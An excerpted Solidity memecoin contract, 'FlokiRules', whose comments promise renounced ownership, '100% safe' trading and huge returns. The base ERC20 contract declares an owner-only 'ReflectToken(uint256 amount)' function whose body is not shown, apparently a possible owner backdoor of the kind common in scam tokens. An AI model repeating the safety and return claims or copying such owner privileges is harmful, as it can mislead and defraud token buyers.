...
/**
   ...
   #LIQ+#RFI+#SHIB+#DOGE, combine together to #FlokiRules  

    I make this #FlokiRules to hand over it to the community.
    Create the community by yourself if you are interested.   
    I suggest a telegram group name for you to create: https://t.me/FlokiRulesBSC
   ...
   I will renounce the ownership to burn addresses to transfer #FlokiRules to the community, make sure it's 100% safe.

   I will add 0.35 BNB and all the left 49.5% total supply to the pool
   Can you make #FlokiRules 10000000X? 
   ...
   it's the best part of the #FlokiRules idea, increasing the liquidity pool automatically, 
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function ReflectToken(uint256 amount) public onlyOwner {
...
contract FlokiRules is ERC20 {

    uint tokenTotalSupply = 1000000000;

    constructor() public ERC20("FlokiRules", "FlokiRules") {
